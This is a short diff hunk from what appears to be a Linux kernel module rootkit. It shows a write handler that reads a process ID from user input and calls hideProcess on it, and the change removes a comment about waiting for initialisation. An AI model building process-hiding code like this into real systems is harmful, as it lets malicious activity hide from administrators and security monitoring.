@@ -79,7 +79,7 @@ static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t le
 	int pidToHide;
 	sscanf(kernelBuffer, "%d", &pidToHide);
 
-	// probably should ensure process hider init has finished..
+
 	hideProcess(pidToHide);
 
 
